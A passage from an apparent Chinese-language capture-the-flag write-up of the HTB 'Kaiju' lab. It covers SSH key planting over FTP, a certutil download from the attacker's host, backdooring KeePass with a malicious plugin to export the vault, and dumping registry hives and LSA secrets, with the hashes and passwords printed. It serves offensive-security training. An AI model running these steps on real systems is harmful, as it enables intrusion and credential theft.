>

```c
cp ./id_sasrv.pub authorized_keys
```

### 上传密钥
```c
ftp> cd /Users/sasrv200/.ssh
ftp> put authorized_keys 
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||65489|)
150 Starting data transfer.
100% |***********************************************************|    91        1.70 MiB/s    00:00 ETA
226 Operation successful
91 bytes sent in 00:00 (0.14 KiB/s)
```

### 验证登录
> 上传公钥，私钥登录
>

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# ssh -i id_sasrv sasrv200@BERSRV200.kaiju.vl

Microsoft Windows [Version 10.0.20348.4052]
(c) Microsoft Corporation. All rights reserved.

kaiju\sasrv200@BERSRV200 C:\Users\sasrv200>
```

## kaiju\sasrv200
### Getflag
```c
kaiju\sasrv200@BERSRV200 C:\Users\sasrv200\Desktop>type flag.txt
KAIJU{55f193142b7a67ced56f770035d135e1}
```

### PrivescCheck
#### 下载
```c
kaiju\sasrv200@BERSRV200 C:\Users\sasrv200\Desktop>certutil.exe -urlcache -split -f http://10.10.16.32/PrivescCheck.ps1
****  Online  ****
  000000  ...
  037762
CertUtil: -URLCache command completed successfully.
```

#### 运行
```c
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT,HTML"
```

#### 发现
> 我所拥有的账户对 Keepass 文件夹中所有文件都有写入权限
>

![](/image/hackthebox-prolabs/Kaiju-12.png)

## Keepass
> 我们之前通过ftp:ftp递归下载拿到了一部分敏感文件
>
> Software/KeePass2/Database 文件夹其中包含了keepass的数据库文件it.kdbx
>

![](/image/hackthebox-prolabs/Kaiju-13.png)

### 利用链接
> [https://github.com/denandz/KeeFarce/tree/master](https://github.com/denandz/KeeFarce/tree/master)
>
> [https://github.com/d3lb3/KeeFarceReborn](https://github.com/d3lb3/KeeFarceReborn)
>
> [https://blog.quarkslab.com/post-exploitation-abusing-the-keepass-plugin-cache.html](https://blog.quarkslab.com/post-exploitation-abusing-the-keepass-plugin-cache.html)
>
> [https://blog.spookysec.net/Backdooring-KeePass/](https://blog.spookysec.net/Backdooring-KeePass/)
>
> [https://github.com/plackyhacker/Malicious-KeePass-Plugin](https://github.com/plackyhacker/Malicious-KeePass-Plugin)
>
> [https://github.com/pfn/keepasshttp](https://github.com/pfn/keepasshttp)
>

### 从 FTP 下载 KeePass.exe
```bash
ftp backup@BERSRV200.kaiju.vl
ftp> cd "E:/Public/Software/KeePass2"
ftp> get KeePass.exe
ftp> exit
```

---

### 克隆并修改 KeeFarceReborn
```bash
git clone https://github.com/d3lb3/KeeFarceReborn
cd KeeFarceReborn/KeeFarceRebornPlugin
```

**修改项目引用**（在 `.csproj` 文件中）：

```xml
<Reference Include="KeePass">
  <HintPath>path\to\KeePass.exe</HintPath>
</Reference>
```

---

### 修改插件代码
> `C:\ProgramData` 对所有用户有写权限：
>
> C:\ProgramData\ BUILTIN\Users:(CI)(WD,AD,WEA,WA)   ← 可写
>

**需要修改两处：**

1. **禁用弹窗** - 注释或删除所有 `MessageBox.Show(...)`
2. **修改导出路径**（改为可写位置）：

```csharp
string exportFilePath = @\"C:\\ProgramData\\export.xml\";
```

---

### 编译dll
```plain
dotnet build KeeFarceRebornPlugin.csproj -c Release --no-incremental
```

---

### 创建 KeePass 配置文件
> 初始配置中 `PreferUserConfiguration=true`，意味着 KeePass 会优先读取运行用户 AppData 中的配置，忽略全局配置，需要改为 `false`
>
> 将编辑的代码文件命名为KeePass.config.xml
>

```xml
<?xml version="1.0" encoding="utf-8"?>
<Configuration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<Meta>
		<PreferUserConfiguration>false</PreferUserConfiguration>
	</Meta>
<Policy>
	<Plugins>true</Plugins>
	<Export>true</Export>
</Policy>
</Configuration>
```

---

### 上传到目标机器
```bash
# 上传 DLL 到 Plugins 目录
scp -i id_sasrv KeeFarceRebornPlugin.dll sasrv200@10.13.38.41:'E:/Public/Software/KeePass2/Plugins/KeeFarceRebornPlugin.dll'
# 上传配置文件
scp -i id_sasrv KeePass.config.xml sasrv200@10.13.38.41:'E:/Public/Software/KeePass2/KeePass.config.xml'
```

---

### 等待并获取导出文件
```powershell
# 等待 export.xml 出现
while (-not (Test-Path "C:\ProgramData\export.xml")) {
    Start-Sleep -Seconds 5
}

# 查看导出内容
type C:\Windows\Temp\export.xml
```

### export.xml
```bash
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<KeePassFile>
        <Meta>
                <Generator>KeePass</Generator>
                <DatabaseName>IT Passwords</DatabaseName>
                <DatabaseNameChanged>2023-12-17T14:50:27Z</DatabaseNameChanged>
                <DatabaseDescription>IT Password Database</DatabaseDescription>
                <DatabaseDescriptionChanged>2023-12-17T14:50:27Z</DatabaseDescriptionChanged>
                <DefaultUserName />
                <DefaultUserNameChanged>2023-12-17T14:50:05Z</DefaultUserNameChanged>
                <MaintenanceHistoryDays>365</MaintenanceHistoryDays>
                <Color />
                <MasterKeyChanged>2023-12-17T14:50:05Z</MasterKeyChanged>
                <MasterKeyChangeRec>-1</MasterKeyChangeRec>
                <MasterKeyChangeForce>-1</MasterKeyChangeForce>
                <MemoryProtection>
                        <ProtectTitle>False</ProtectTitle>
                        <ProtectUserName>False</ProtectUserName>
                        <ProtectPassword>True</ProtectPassword>
                        <ProtectURL>False</ProtectURL>
                        <ProtectNotes>False</ProtectNotes>
                </MemoryProtection>
                <RecycleBinEnabled>True</RecycleBinEnabled>
                <RecycleBinUUID>XGYH0HkCbkGF2XYN2keRmQ==</RecycleBinUUID>
                <RecycleBinChanged>2023-12-17T14:50:05Z</RecycleBinChanged>
                <EntryTemplatesGroup>AAAAAAAAAAAAAAAAAAAAAA==</EntryTemplatesGroup>
                <EntryTemplatesGroupChanged>2023-12-17T14:50:05Z</EntryTemplatesGroupChanged>
                <HistoryMaxItems>10</HistoryMaxItems>
                <HistoryMaxSize>6291456</HistoryMaxSize>
                <LastSelectedGroup>dozpPjwzN02nwfYhoUnjFA==</LastSelectedGroup>
                <LastTopVisibleGroup>mF7+KnY7qkiMdF11L94iFA==</LastTopVisibleGroup>
                <Binaries />
                <CustomData />
        </Meta>
        <Root>
                <Group>
                        <UUID>mF7+KnY7qkiMdF11L94iFA==</UUID>
                        <Name>it</Name>
                        <Notes />
                        <IconID>49</IconID>
                        <Times>
                                <CreationTime>2023-12-17T14:50:05Z</CreationTime>
                                <LastModificationTime>2023-12-17T14:50:05Z</LastModificationTime>
                                <LastAccessTime>2023-12-17T15:36:16Z</LastAccessTime>
                                <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                <Expires>False</Expires>
                                <UsageCount>10</UsageCount>
                                <LocationChanged>2023-12-17T14:50:05Z</LocationChanged>
                        </Times>
                        <IsExpanded>True</IsExpanded>
                        <DefaultAutoTypeSequence />
                        <EnableAutoType>null</EnableAutoType>
                        <EnableSearching>null</EnableSearching>
                        <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>
                        <Group>
                                <UUID>LuO/W+wnLEKYfxGLWujDeg==</UUID>
                                <Name>General</Name>
                                <Notes />
                                <IconID>48</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:27Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T15:36:16Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>1</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:27Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>null</EnableAutoType>
                                <EnableSearching>null</EnableSearching>
                                <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>     
                        </Group>
                        <Group>
                                <UUID>dozpPjwzN02nwfYhoUnjFA==</UUID>
                                <Name>Windows</Name>
                                <Notes />
                                <IconID>38</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:27Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T15:36:16Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>2</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:27Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>null</EnableAutoType>
                                <EnableSearching>null</EnableSearching>
                                <LastTopVisibleEntry>EYIcs2CKVkS5ZpbYbXlfFQ==</LastTopVisibleEntry>     
                                <Entry>
                                        <UUID>EYIcs2CKVkS5ZpbYbXlfFQ==</UUID>
                                        <IconID>38</IconID>
                                        <ForegroundColor />
                                        <BackgroundColor />
                                        <OverrideURL />
                                        <Tags />
                                        <Times>
                                                <CreationTime>2023-12-17T15:36:18Z</CreationTime>       
                                                <LastModificationTime>2023-12-17T15:37:07Z</LastModificationTime>
                                                <LastAccessTime>2023-12-17T15:37:07Z</LastAccessTime>   
                                                <ExpiryTime>2023-12-17T15:35:48Z</ExpiryTime>
                                                <Expires>False</Expires>
                                                <UsageCount>1</UsageCount>
                                                <LocationChanged>2023-12-17T15:36:18Z</LocationChanged> 
                                        </Times>
                                        <String>
                                                <Key>Notes</Key>
                                                <Value />
                                        </String>
                                        <String>
                                                <Key>Password</Key>
                                                <Value ProtectInMemory="True">NakedMelonMan25</Value>   
                                        </String>
                                        <String>
                                                <Key>Title</Key>
                                                <Value>BERSRV200</Value>
                                        </String>
                                        <String>
                                                <Key>URL</Key>
                                                <Value />
                                        </String>
                                        <String>
                                                <Key>UserName</Key>
                                                <Value>Administrator </Value>
                                        </String>
                                        <AutoType>
                                                <Enabled>True</Enabled>
                                                <DataTransferObfuscation>0</DataTransferObfuscation>    
                                        </AutoType>
                                        <History />
                                </Entry>
                        </Group>
                        <Group>
                                <UUID>o0fuw6P/PE6xbrnacM91ww==</UUID>
                                <Name>Network</Name>
                                <Notes />
                                <IconID>3</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:27Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T14:50:32Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>1</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:27Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>null</EnableAutoType>
                                <EnableSearching>null</EnableSearching>
                                <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>     
                        </Group>
                        <Group>
                                <UUID>DevgijZ4JESJclsdyEVHig==</UUID>
                                <Name>Internet</Name>
                                <Notes />
                                <IconID>1</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:27Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T14:50:32Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>1</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:27Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>null</EnableAutoType>
                                <EnableSearching>null</EnableSearching>
                                <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>     
                        </Group>
                        <Group>
                                <UUID>DNoXlPOLekmA1fTbR5vh6Q==</UUID>
                                <Name>eMail</Name>
                                <Notes />
                                <IconID>19</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:27Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T14:50:32Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>1</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:27Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>null</EnableAutoType>
                                <EnableSearching>null</EnableSearching>
                                <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>     
                        </Group>
                        <Group>
                                <UUID>FsuviBl2+0ijJKN2AeSpJQ==</UUID>
                                <Name>Homebanking</Name>
                                <Notes />
                                <IconID>37</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:27Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T14:50:33Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>1</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:27Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>null</EnableAutoType>
                                <EnableSearching>null</EnableSearching>
                                <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>     
                        </Group>
                        <Group>
                                <UUID>XGYH0HkCbkGF2XYN2keRmQ==</UUID>
                                <Name>Recycle Bin</Name>
                                <Notes />
                                <IconID>43</IconID>
                                <Times>
                                        <CreationTime>2023-12-17T14:50:29Z</CreationTime>
                                        <LastModificationTime>2023-12-17T14:50:29Z</LastModificationTime>
                                        <LastAccessTime>2023-12-17T14:50:31Z</LastAccessTime>
                                        <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                        <Expires>False</Expires>
                                        <UsageCount>2</UsageCount>
                                        <LocationChanged>2023-12-17T14:50:29Z</LocationChanged>
                                </Times>
                                <IsExpanded>True</IsExpanded>
                                <DefaultAutoTypeSequence />
                                <EnableAutoType>false</EnableAutoType>
                                <EnableSearching>false</EnableSearching>
                                <LastTopVisibleEntry>AAAAAAAAAAAAAAAAAAAAAA==</LastTopVisibleEntry>     
                                <Entry>
                                        <UUID>lp63s6GV1EW/+a+tVjV2yg==</UUID>
                                        <IconID>0</IconID>
                                        <ForegroundColor />
                                        <BackgroundColor />
                                        <OverrideURL />
                                        <Tags />
                                        <Times>
                                                <CreationTime>2023-12-17T14:50:27Z</CreationTime>       
                                                <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                                <LastAccessTime>2023-12-17T14:50:29Z</LastAccessTime>   
                                                <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                                <Expires>False</Expires>
                                                <UsageCount>1</UsageCount>
                                                <LocationChanged>2023-12-17T14:50:29Z</LocationChanged> 
                                        </Times>
                                        <String>
                                                <Key>Password</Key>
                                                <Value ProtectInMemory="True">12345</Value>
                                        </String>
                                        <String>
                                                <Key>Title</Key>
                                                <Value>Sample Entry #2</Value>
                                        </String>
                                        <String>
                                                <Key>URL</Key>
                                                <Value>http://keepass.info/help/kb/testform.html</Value>
                                        </String>
                                        <String>
                                                <Key>UserName</Key>
                                                <Value>Michael321</Value>
                                        </String>
                                        <AutoType>
                                                <Enabled>True</Enabled>
                                                <DataTransferObfuscation>0</DataTransferObfuscation>    
                                                <Association>
                                                        <Window>*Test Form - KeePass*</Window>
                                                        <KeystrokeSequence />
                                                </Association>
                                        </AutoType>
                                        <History />
                                </Entry>
                                <Entry>
                                        <UUID>YiEvfSoEdUSvtnkWjTPkMQ==</UUID>
                                        <IconID>0</IconID>
                                        <ForegroundColor />
                                        <BackgroundColor />
                                        <OverrideURL />
                                        <Tags />
                                        <Times>
                                                <CreationTime>2023-12-17T14:50:27Z</CreationTime>       
                                                <LastModificationTime>2023-12-17T14:50:27Z</LastModificationTime>
                                                <LastAccessTime>2023-12-17T14:50:31Z</LastAccessTime>   
                                                <ExpiryTime>2023-12-17T14:48:53Z</ExpiryTime>
                                                <Expires>False</Expires>
                                                <UsageCount>1</UsageCount>
                                                <LocationChanged>2023-12-17T14:50:31Z</LocationChanged> 
                                        </Times>
                                        <String>
                                                <Key>Notes</Key>
                                                <Value>Notes</Value>
                                        </String>
                                        <String>
                                                <Key>Password</Key>
                                                <Value ProtectInMemory="True">Password</Value>
                                        </String>
                                        <String>
                                                <Key>Title</Key>
                                                <Value>Sample Entry</Value>
                                        </String>
                                        <String>
                                                <Key>URL</Key>
                                                <Value>http://keepass.info/</Value>
                                        </String>
                                        <String>
                                                <Key>UserName</Key>
                                                <Value>User Name</Value>
                                        </String>
                                        <AutoType>
                                                <Enabled>True</Enabled>
                                                <DataTransferObfuscation>0</DataTransferObfuscation>    
                                                <Association>
                                                        <Window>Target Window</Window>
                                                        <KeystrokeSequence>{USERNAME}{TAB}{PASSWORD}{TAB}{ENTER}</KeystrokeSequence>
                                                </Association>
                                        </AutoType>
                                        <History />
                                </Entry>
                        </Group>
                </Group>
                <DeletedObjects />
        </Root>
</KeePassFile>

```

### 获得凭据
查看文件并找到凭据：

```plain
<Entry>
  <String><Key>Title</Key><Value>BERSRV200</Value></String>
  <String><Key>UserName</Key><Value>Administrator </Value></String>
  <String><Key>Password</Key><Value ProtectInMemory="True">NakedMelonMan25</Value></String>
</Entry>
```

---

## Administrator-172.16.90.50
```bash
ssh Administrator@10.13.38.41
# 密码：NakedMelonMan25
```

成功以 `BERSRV200\\Administrator` 身份登录，具有完整本地管理员权限（High Mandatory Level）

### Getflag
```bash
administrator@BERSRV200 C:\Users\Administrator\Desktop>type flag.txt
KAIJU{8c07d15520302f78cbf044945732b40a}
```

### 查看域信任
```bash
administrator@BERSRV200 C:\Users>nltest /domain_trusts
List of domain trusts:
    0: KAIJU kaiju.vl (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

### whoami
> 可以发现我们拿到的权限是本地管理员而不是域管
>

```bash
bersrv200\administrator
```

### 转储LSA
```bash
reg save HKLM\SYSTEM C:\ProgramData\SYSTEM
reg save HKLM\SAM C:\ProgramData\SAM
reg save HKLM\SECURITY C:\ProgramData\SECURITY
```

### 下载LSA
```bash
scp -i id_sasrv Administrator@10.13.38.41:'C:/ProgramData/SYSTEM' .
scp -i id_sasrv Administrator@10.13.38.41:'C:/ProgramData/SAM' .
scp -i id_sasrv Administrator@10.13.38.41:'C:/ProgramData/SECURITY' .
```

### secretsdump
> 三条命令效果一致
>

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# netexec smb 10.13.38.41 -u administrator -p 'NakedMelonMan25' --local-auth --lsa
SMB         10.13.38.41     445    BERSRV200        [*] Windows Server 2022 Build 20348 (name:BERSRV200) (domain:BERSRV200) (signing:False) (SMBv1:None)
SMB         10.13.38.41     445    BERSRV200        [+] BERSRV200\administrator:NakedMelonMan25 (Pwn3d!)                                                                                                      
SMB         10.13.38.41     445    BERSRV200        [*] Dumping LSA secrets
SMB         10.13.38.41     445    BERSRV200        KAIJU.VL/sasrv200:$DCC2$10240#sasrv200#44a1583ed4678aa2fba0bd7d13eea30f: (2025-08-28 07:57:45)                                                            
SMB         10.13.38.41     445    BERSRV200        KAIJU.VL/Clare.Frost:$DCC2$10240#Clare.Frost#180216e4d0aa40dbf4767dd7ba50f187: (2026-03-23 03:49:43)                                                      
SMB         10.13.38.41     445    BERSRV200        KAIJU.VL/Administrator:$DCC2$10240#Administrator#873c4a9511ccfd89537a22fc1cc3ff35: (2025-08-28 09:33:51)                                                  
SMB         10.13.38.41     445    BERSRV200        KAIJU\BERSRV200$:aes256-cts-hmac-sha1-96:4679f53c16571e95008a89659a9f8421429fd94927e3dc3b46d1cea492bcff2a                                                 
SMB         10.13.38.41     445    BERSRV200        KAIJU\BERSRV200$:aes128-cts-hmac-sha1-96:a9f44bcb69f7ba754331ed35f91f55b6                                                                                 
SMB         10.13.38.41     445    BERSRV200        KAIJU\BERSRV200$:des-cbc-md5:3bd0c8b620b01354
SMB         10.13.38.41     445    BERSRV200        KAIJU\BERSRV200$:plain_password_hex:7d094846e01229dd09bedb0c84b2521bfe9442607a550bd69845d707bc5693b781343ce34697650f60a1d1eeb78b96ccbc2529a5532663821d754719b544ff379f9de56aa785308050769f8824d47316dbc590228e2b62a6ba7264200e3e03f654b0562891ae00cd3a29a8565dc6ab32f592a2a84bc4e44cd760ec052f43de542f3b156a99e6e8dc56a21fe50e56951185de240db1d41c53bddbbb4c88afa12164558e687ed4771af4073d74902c177a6db24b1efe2263aba9910b407d23b7eaa3a71623ba6e1c02bb4018ae0cdf54ba39763ead79a79d8c98c926638d73aaea43fdfe5b8790ca91976091727c9c3150                                                  
SMB         10.13.38.41     445    BERSRV200        KAIJU\BERSRV200$:aad3b435b51404eeaad3b435b51404ee:8ac8ef1db4beada03a9794c971292d1e:::                                                                     
SMB         10.13.38.41     445    BERSRV200        kaiju.vl\clare.frost:atnTYzyew3Ok+d
SMB         10.13.38.41     445    BERSRV200        dpapi_machinekey:0x2aa75aaaf206bfaee9c962443bdf9c2b6f3dca59                                                                                               
SMB         10.13.38.41     445    BERSRV200        dpapi_userkey:0x43b9ced8e9f1fe8ccad60dbdff5563d9ce01503b
SMB         10.13.38.41     445    BERSRV200        kaiju.vl\sasrv200:7rq7uf26brZgcSSX
```

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# secretsdump.py Administrator:'NakedMelonMan25'@10.13.38.41
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9a5fc7f0da68261a7fff3339b24df15f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fffcb929473dabc53b797221ecbdb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bc29943ab52fa93a59ab94049543b634:::
backup:1002:aad3b435b51404eeaad3b435b51404ee:3fe84dbae69d1ce96d3babfb58a848cb:::
[*] Dumping cached domain logon information (domain/username:hash)
KAIJU.VL/sasrv200:$DCC2$10240#sasrv200#44a1583ed4678aa2fba0bd7d13eea30f: (2025-08-28 07:57:45+00:00)
KAIJU.VL/Clare.Frost:$DCC2$10240#Clare.Frost#180216e4d0aa40dbf4767dd7ba50f187: (2026-03-23 03:49:43+00:00)
KAIJU.VL/Administrator:$DCC2$10240#Administrator#873c4a9511ccfd89537a22fc1cc3ff35: (2025-08-28 09:33:51+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
KAIJU\BERSRV200$:aes256-cts-hmac-sha1-96:4679f53c16571e95008a89659a9f8421429fd94927e3dc3b46d1cea492bcff2a
KAIJU\BERSRV200$:aes128-cts-hmac-sha1-96:a9f44bcb69f7ba754331ed35f91f55b6
KAIJU\BERSRV200$:des-cbc-md5:3bd0c8b620b01354
KAIJU\BERSRV200$:plain_password_hex:7d094846e01229dd09bedb0c84b2521bfe9442607a550bd69845d707bc5693b781343ce34697650f60a1d1eeb78b96ccbc2529a5532663821d754719b544ff379f9de56aa785308050769f8824d47316dbc590228e2b62a6ba7264200e3e03f654b0562891ae00cd3a29a8565dc6ab32f592a2a84bc4e44cd760ec052f43de542f3b156a99e6e8dc56a21fe50e56951185de240db1d41c53bddbbb4c88afa12164558e687ed4771af4073d74902c177a6db24b1efe2263aba9910b407d23b7eaa3a71623ba6e1c02bb4018ae0cdf54ba39763ead79a79d8c98c926638d73aaea43fdfe5b8790ca91976091727c9c3150
KAIJU\BERSRV200$:aad3b435b51404eeaad3b435b51404ee:8ac8ef1db4beada03a9794c971292d1e:::
[*] DefaultPassword 
kaiju.vl\clare.frost:atnTYzyew3Ok+d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2aa75aaaf206bfaee9c962443bdf9c2b6f3dca59
dpapi_userkey:0x43b9ced8e9f1fe8ccad60dbdff5563d9ce01503b
[*] NL$KM 
 0000   F0 00 76 55 DC D9 4E 9A  C9 D9 62 97 42 0E 6E 47   ..vU..N...b.B.nG
 0010   6D 04 12 54 82 E1 34 4A  D5 39 E3 05 A5 DA 4D 89   m..T..4J.9....M.
 0020   EF 55 4F 90 51 7A E4 35  1B 79 90 56 DA 2D 74 55   .UO.Qz.5.y.V.-tU
 0030   1A 14 29 A0 AB D9 12 4D  E1 A7 E9 28 31 4C ED 3E   ..)....M...(1L.>
NL$KM:f0007655dcd94e9ac9d96297420e6e476d04125482e1344ad539e305a5da4d89ef554f90517ae4351b799056da2d74551a1429a0abd9124de1a7e928314ced3e
[*] _SC_filezilla-server 
kaiju.vl\sasrv200:7rq7uf26brZgcSSX
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Kaiju]
└─# secretsdump.py Administrator:'NakedMelonMan25'@10.13.38.41
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x9a5fc7f0da68261a7fff3339b24df15f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fffcb929473dabc53b797221ecbdb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bc29943ab52fa93a59ab94049543b634:::
backup:1002:aad3b435b51404eeaad3b435b51404ee:3fe84dbae69d1ce96d3babfb58a848cb:::
[*] Dumping cached domain logon information (domain/username:hash)
KAIJU.VL/sasrv200:$DCC2$10240#sasrv200#44a1583ed4678aa2fba0bd7d13eea30f: (2025-08-28 07:57:45+00:00)
KAIJU.VL/Clare.Frost:$DCC2$10240#Clare.Frost#180216e4d0aa40dbf4767dd7ba50f187: (2026-03-23 03:49:43+00:00)
KAIJU.VL/Administrator:$DCC2$10240#Administrator#873c4a9511ccfd89537a22fc1cc3ff35: (2025-08-28 09:33:51+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
KAIJU\BERSRV200$:aes256-cts-hmac-sha1-96:4679f53c16571e95008a89659a9f8421429fd94927e3dc3b46d1cea492bcff2a
KAIJU\BERSRV200$:aes128-cts-hmac-sha1-96:a9f44bcb69f7ba754331ed35f91f55b6
KAIJU\BERSRV200$:des-cbc-md5:3bd0c8b620b01354
KAIJU\BERSRV200$:plain_password_hex:7d094846e01229dd09bedb0c84b2521bfe9442607a550bd69845d707bc5693b781343ce34697650f60a1d1eeb78b96ccbc2529a5532663821d754719b544ff379f9de56aa785308050769f8824d47316dbc590228e2b62a6ba7264200e3e03f654b0562891ae00cd3a29a8565dc6ab32f592a2a84bc4e44cd760ec052f43de542f3b156a99e6e8dc56a21fe50e56951185de240db1d41c53bddbbb4c88afa12164558e687ed4771af4073d74902c177a6db24b1efe2263aba9910b407d23b7eaa3a71623ba6e1c02bb4018ae0cdf54ba39763ead79a79d8c98c926638d73aaea43fdfe5b8790ca91976091727c9c3150
KAIJU\BERSRV200$:aad3b435b51404eeaad3b435b51404ee:8ac8ef1db4beada03a9794c971292d1e:::
[*] DefaultPassword 
kaiju.vl\clare.frost:atnTYzyew3Ok+d
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x2aa75aaaf206bfaee9c962443bdf9c2b6f3dca59
dpapi_userkey:0x43b9ced8e9f1fe8ccad60dbdff5563d9ce01503b
[*] NL$KM 
 0000   F0 00 76 55 DC D9 4E 9A  C9 D9 62 97 42 0E 6E 47   ..vU..N...b.B.nG
 0010   6D 04 12 54 82 E1 34 4A  D5 39 E3 05 A5 DA 4D 89   m..T..4J.9....M.
 0020   EF 55 4F 90 51 7A E4 35  1B 79 90 56 DA 2D 74 55   .UO.Qz.5.y.V.-tU
 0030   1A 14 29 A0 AB D9 12 4D  E1 A7 E9 28 31 4C ED 3E   ..)....M...(1L.>
NL$KM:f0007655dcd94e9ac9d96297420e6e476d04125482e1344ad539e305a5da4d89ef554f90517ae4351b799056da2d74551a1429a0abd9124de1a7e928314ced3e
[*] _SC_filezilla-server 
kaiju.vl\sasrv200:7rq7uf26brZgcSSX
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

### ipconfig
```bash
administrator@BERSRV200 C:\Users\Public>ipconfig

Windows IP Configuration


Ethernet adapter Internal:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::23e0:44ca:fec9:c652%10
   IPv4 Address. . . . . . . . . . . : 172.16.90.50  
   Subnet Mask . . . . . . . . . . . : 255.255.255.0 
   Default Gateway . . . . . . . . . :

Ethernet adapter External:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::a799:4678:8861:1ad9
   Link-local IPv6 Address . . . . . : fe80::6b30:87b6:a8dd:4427%3
   IPv4 Address. . . . . . . . . . . : 10.13.38.41   
   Subnet Mask . . . . . . . . . . . : 255.255.255.0 
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:7673%3
